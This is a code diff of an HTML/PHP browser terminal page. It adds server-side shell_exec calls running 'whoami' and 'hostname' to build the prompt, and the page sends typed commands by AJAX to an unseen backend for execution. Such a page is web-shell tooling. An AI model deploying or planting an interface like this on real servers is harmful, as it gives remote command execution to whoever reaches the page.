@@ -1,4 +1,8 @@
 <!DOCTYPE html>
+<?php 
+	$PS1 = str_replace("\n","","[".shell_exec('whoami')." @ ".shell_exec("hostname")."] >> ");
+?>
+
 <html>
 	<head>
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js">
@@ -9,7 +13,9 @@
 		<body>
 			<div id="resultWrapper">
 			</div>
-			<div id="promptBox"><div class="promptPS1"> [root @ blastzone] $ </div>
+			<div id="promptBox"><div class="promptPS1"> 
+				<?php print $PS1; ?>
+			</div>
 			<input id="shell" class="promptInput" autofocus on type="text">  </div>
 		</body>	
 	</div>
@@ -36,7 +42,7 @@ document.getElementById("shell").addEventListener("keyup", function(event)
 			success: function(data)
 			{
 				//Create div with result from exec()
-				$("#resultWrapper").append("<div id='"+stackpointer+"'><a style='margin-bottom:2px;color:white;'>[apache@localhost] $ "+command + "</a><br>" + printJSON(data) + "</div>");				
+				$("#resultWrapper").append("<div id='"+stackpointer+"'><a style='margin-bottom:2px;color:white;'><?php echo $PS1 ?> $ "+command + "</a><br>" + printJSON(data) + "</div>");				
 				//Handle the text buffer/flow
 				stackpointer++;
 				resultCounter.push(stackpointer);
@@ -58,6 +64,7 @@ document.getElementById("shell").addEventListener("keyup", function(event)
     }
 });
 
+//Will deserialize the result of a command
 function printJSON(info)
 {
 	var myObj = JSON.parse(info);
